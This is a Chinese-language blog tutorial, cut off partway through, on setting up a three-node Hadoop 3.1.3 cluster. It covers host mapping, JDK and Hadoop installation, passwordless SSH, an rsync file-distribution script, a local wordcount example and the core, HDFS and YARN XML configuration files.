      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>本文来搭建hadoop集群，准备三台服务器，分别为hadoop102,hadoop103,hadoop104.其中hadoop 采用3.1.3版本，jdk      采用1.8.0_212  。</p><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2 准备工作"></a>2 准备工作</h2><h3 id="2-1-映射"><a href="#2-1-映射" class="headerlink" title="2.1 映射"></a>2.1 映射</h3><p>为了方便直接通过主机名去访问，下面进行映射</p><p>1）修改克隆机主机名，以下以hadoop102举例说明</p><p>（1）修改主机名称，：修改/etc/hostname文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/hostname</span>hadoop102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）配置linux克隆机主机名称映射hosts文件，打开/etc/hosts</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim /etc/hosts</span>192.168.1.102 hadoop102192.168.1.103 hadoop103192.168.1.104 hadoop104<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）重启hadoop102</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop100 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）修改windows的主机映射文件（hosts文件）</p><p>操作系统是window10，先拷贝出来，修改保存以后，再覆盖即可</p><p>（a）进入C:\Windows\System32\drivers\etc路径</p><p>（b）拷贝hosts文件到桌面</p><p> （c）打开桌面hosts文件并添加如下内容</p><pre><code>192.168.1.102 hadoop102192.168.1.103 hadoop103192.168.1.104 hadoop104</code></pre><p>（d）将桌面hosts文件覆盖C:\Windows\System32\drivers\etc路径hosts文件</p><h3 id="2-2-安装JDK"><a href="#2-2-安装JDK" class="headerlink" title="2.2 安装JDK"></a>2.2 安装JDK</h3><p>1）在Linux系统下的opt目录中下载软件包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> /opt/software/jdk-8u212-linux-x64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）解压JDK到/opt/module目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）配置JDK环境变量</p><p>​    （1）新建/etc/profile.d/my_env.sh文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><p>#JAVA_HOME</p><p>export JAVA_HOME=/opt/module/jdk1.8.0_212</p><p>export PATH=$PATH:$JAVA_HOME/bin</p><p>​    （2）保存后退出:wq</p><p>​    （3）source一下/etc/profile文件，让新的环境变量PATH生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）测试JDK是否安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果能看到以下结果，则代表Java安装成功。</p><p>java version “1.8.0_212”</p><p>注意：重启（如果java -version可以用就不用重启）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-3-SSH免密码登录"><a href="#2-3-SSH免密码登录" class="headerlink" title="2.3 SSH免密码登录"></a>2.3 SSH免密码登录</h3><p>免密登录原理如下图所示：</p><p><img src="/2020/11/12/bigdata-hdfs1/1636709256729.png" alt="1636709256729"></p><p>具体操作如下：</p><p>1）生成公钥和私钥：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 .ssh<span class="token punctuation">]</span>$ ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后敲（三个回车），就会生成两个文件id_rsa（私钥）、id_rsa.pub（公钥）</p><p>2）将公钥拷贝到要免密登录的目标机器上</p><p>[root@hadoop102 .ssh]$ ssh-copy-id hadoop102</p><p>[root@hadoop102 .ssh]$ ssh-copy-id hadoop103</p><p>[root@hadoop102 .ssh]$ ssh-copy-id hadoop104</p><p>这样hadoop102登录到hadoop103和hadoop104就不需要输入密码了。可以相互登录 还需要在hadoop103和hadoop104上做同样的操作。</p><h3 id="2-4-编写集群分发脚本"><a href="#2-4-编写集群分发脚本" class="headerlink" title="2.4 编写集群分发脚本"></a>2.4 编写集群分发脚本</h3><p>为了在集群中各个主机中文件拷贝方便，我们可以写个脚本用于三台主机中分发文件。</p><p>（1）需求：循环复制文件到所有节点的相同目录下</p><p>（2）需求分析：</p><p>（a）rsync命令原始拷贝：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av   /opt/module     root@hadoop103:/opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（b）期望脚本：</p><p>xsync要同步的文件名称</p><p>（c）说明：在/home/root/bin这个目录下存放的脚本，root用户可以在系统任何地方直接执行。</p><p>（3）脚本实现</p><p>（a）在/home/root/bin目录下创建xsync文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> bin<span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ vim xsync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在该文件中编写如下代码</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash\#1. 判断参数个数if [ $# -lt 1 ]then echo Not Enough Arguement! exit;fi\#2. 遍历集群所有机器for host in hadoop102 hadoop103 hadoop104do echo ==================== $host ==================== \#3. 遍历所有目录，挨个发送 for file in $@ do  \#4. 判断文件是否存在  if [ -e $file ]  then   \#5. 获取父目录   pdir=$(cd -P $(dirname $file); pwd)   \#6. 获取当前文件的名称   fname=$(basename $file)   ssh $host "mkdir -p $pdir"   rsync -av $pdir/$fname $host:$pdir  else   echo $file does not exists!  fi donedone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（b）修改脚本 xsync 具有执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x xsync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（c）将脚本复制到/bin中，以便全局调用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">cp</span> xsync /bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（d）测试脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ xsync /home/root/bin<span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">sudo</span> xsync /bin/xsync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-安装hadoop"><a href="#3-安装hadoop" class="headerlink" title="3 安装hadoop"></a>3 安装hadoop</h2><p>Hadoop下载地址：<a href="https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/">https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/</a></p><p>1）下载hadoop并进入到Hadoop安装包路径下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /opt/software/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）解压安装文件到/opt/module下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf hadoop-3.1.3.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查看是否解压成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">ls</span> /opt/module/hadoop-3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）将Hadoop添加到环境变量</p><p>​    （1）获取Hadoop安装路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）打开/etc/profile.d/my_env.sh文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在my_env.sh文件末尾添加如下内容：（shift+g）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#HADOOP_HOME</span><span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HADOOP_HOME</span>/bin<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HADOOP_HOME</span>/sbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（3）保存后退出:wq</p><p>（4）让修改后的文件生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）测试是否安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop versionHadoop 3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）重启(如果Hadoop命令不能用再重启)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">sync</span><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-Hadoop运行模式启动"><a href="#4-Hadoop运行模式启动" class="headerlink" title="4  Hadoop运行模式启动"></a>4  Hadoop运行模式启动</h2><p>Hadoop运行模式包括：本地模式、伪分布式模式以及完全分布式模式。本地允许模式很简单，公司用的大部分是完全分布式模式。</p><p>Hadoop官方网站：<a href="http://hadoop.apache.org/">http://hadoop.apache.org/</a></p><h3 id="4-1-本地运行模式"><a href="#4-1-本地运行模式" class="headerlink" title="4.1 本地运行模式"></a>4.1 本地运行模式</h3><p>下面展示hadoop本地运行模式，并成功计算一个wordcout功能</p><p>1）创建在hadoop-3.1.3文件下面创建一个wcinput文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> wcinpu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在wcinput文件下创建一个word.txt文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">cd</span> wcinput<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）编辑word.txt文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 wcinput<span class="token punctuation">]</span>$ vim word.txthadoop yarnhadoop mapreducerootroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存退出：：wq</p><p>4）回到Hadoop目录/opt/module/hadoop-3.1.3</p><p>5）执行程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount wcinput wcoutput<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）查看结果</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">cat</span> wcoutput/part-r-00000root 2hadoop 2mapreduce    1yarn  1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-完全分布式模式"><a href="#4-2-完全分布式模式" class="headerlink" title="4.2 完全分布式模式"></a>4.2 完全分布式模式</h3><h4 id="4-2-1-集群规划"><a href="#4-2-1-集群规划" class="headerlink" title="4.2.1 集群规划"></a>4.2.1 集群规划</h4><p>准备三台机器，分别安装HDFS和yarn。</p><table><thead><tr><th></th><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode  DataNode</td><td>DataNode</td><td>SecondaryNameNode  DataNode</td></tr><tr><td>YARN</td><td>NodeManager</td><td>ResourceManager  NodeManager</td><td>NodeManager</td></tr></tbody></table><p>注意：NameNode和SecondaryNameNode不要安装在同一台服务器</p><p>注意：ResourceManager也很消耗内存，不要和NameNode、SecondaryNameNode配置在同一台机器上。</p><h4 id="4-2-2-配置文件说明"><a href="#4-2-2-配置文件说明" class="headerlink" title="4.2.2 配置文件说明"></a>4.2.2 配置文件说明</h4><p>Hadoop配置文件分两类：默认配置文件和自定义配置文件，只有用户想修改某一默认配置值时，才需要修改自定义配置文件，更改相应属性值。</p><p>（1）默认配置文件：</p><table><thead><tr><th>要获取的默认文件</th><th>文件存放在Hadoop的jar包中的位置</th></tr></thead><tbody><tr><td>[core-default.xml]</td><td>hadoop-common-3.1.3.jar/  core-default.xml</td></tr><tr><td>[hdfs-default.xml]</td><td>hadoop-hdfs-3.1.3.jar/  hdfs-default.xml</td></tr><tr><td>[yarn-default.xml]</td><td>hadoop-yarn-common-3.1.3.jar/  yarn-default.xml</td></tr><tr><td>[mapred-default.xml]</td><td>hadoop-mapreduce-client-core-3.1.3.jar/  mapred-default.xml</td></tr></tbody></table><p>2）自定义配置文件：</p><p>core-site.xml、hdfs-site.xml、yarn-site.xml、mapred-site.xml四个配置文件存放在$HADOOP_HOME/etc/hadoop这个路径上，用户可以根据项目需求重新进行修改配置。</p><p>（3）常用端口号说明</p><table><thead><tr><th>Daemon</th><th>App</th><th>Hadoop2</th><th>Hadoop3</th></tr></thead><tbody><tr><td>NameNode Port</td><td>Hadoop HDFS NameNode</td><td>8020 / 9000</td><td>9820</td></tr><tr><td></td><td>Hadoop HDFS NameNode HTTP UI</td><td>50070</td><td>9870</td></tr><tr><td>Secondary NameNode Port</td><td>Secondary NameNode</td><td>50091</td><td>9869</td></tr><tr><td></td><td>Secondary NameNode HTTP UI</td><td>50090</td><td>9868</td></tr><tr><td>DataNode Port</td><td>Hadoop HDFS DataNode IPC</td><td>50020</td><td>9867</td></tr><tr><td></td><td>Hadoop HDFS DataNode</td><td>50010</td><td>9866</td></tr><tr><td></td><td>Hadoop HDFS DataNode HTTP UI</td><td>50075</td><td>9864</td></tr></tbody></table><h4 id="4-2-3-配置集群"><a href="#4-2-3-配置集群" class="headerlink" title="4.2.3 配置集群"></a>4.2.3 配置集群</h4><p>（1）核心配置文件：配置core-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> <span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim core-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定NameNode的地址 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>fs.defaultFS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hdfs://hadoop102:9820<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 指定hadoop数据的存储目录 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.tmp.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/module/hadoop-3.1.3/data<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配HDFS网页登录使用的静态用户为root --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.http.staticuser.user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理访问的主机节点 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.hosts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理用户所属组 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.groups<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理的用户--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.groups<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）HDFS配置文件:配置hdfs-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim hdfs-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- nn web端访问地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop102:9870<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 2nn web端访问地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.secondary.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop104:9868<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）YARN配置文件:配置yarn-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim yarn-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定MR走shuffle --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.aux-services<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>mapreduce_shuffle<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 指定ResourceManager的地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.hostname<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop103<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 环境变量的继承 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.env-whitelist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- yarn容器允许分配的最大最小内存 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.minimum-allocation-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>512<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.maximum-allocation-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>4096<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- yarn容器允许管理的物理内存大小 --></span>  <span class="token tag"><span class="token tag"><span class="token 